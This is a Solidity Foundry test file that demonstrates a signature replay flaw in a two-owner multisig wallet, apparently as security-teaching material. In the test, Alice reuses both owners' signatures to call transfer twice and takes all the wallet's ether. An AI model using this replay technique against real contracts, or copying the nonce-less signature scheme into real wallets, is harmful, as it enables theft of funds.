// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test, console } from "forge-std/Test.sol";
import { MultiSigWallet } from "../src/SignatureReplay.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract SignatureReplayTest is Test {
    MultiSigWallet public wallet;
    address[2] public owners;
    address public alice;
    address public bob;
    uint256 public alicePk;
    uint256 public bobPk;

    function setUp() public {
        (alice, alicePk) = makeAddrAndKey("alice");
        (bob, bobPk) = makeAddrAndKey("bob");
        owners = [alice, bob];
        wallet = new MultiSigWallet(owners);

        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);

        // both alice and bob deposit 1 ether into the multisig wallet
        vm.prank(alice);
        wallet.deposit{ value: 1 ether }();

        vm.prank(bob);
        wallet.deposit{ value: 1 ether }();
    }

    function testSignatureCanBeReused() public {
        bytes32 hash = wallet.getTxHash(address(alice), 1 ether);
        bytes32 ethSignedHash = MessageHashUtils.toEthSignedMessageHash(hash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, ethSignedHash);
        bytes memory aliceSig = abi.encodePacked(r, s, v);

        (v, r, s) = vm.sign(bobPk, ethSignedHash);
        bytes memory bobSig = abi.encodePacked(r, s, v);
        bytes[2] memory signatures = [aliceSig, bobSig];

        vm.startPrank(alice);
        wallet.transfer(alice, 1 ether, signatures);
        // Alice can now reuse the signature and use it to transfer eth again
        wallet.transfer(alice, 1 ether, signatures); // this transaction won't fail as the contract is vulnerable to signature replay
        vm.stopPrank();

        assertEq(address(wallet).balance, 0);
        assertEq(address(alice).balance, 2 ether);
    }
}
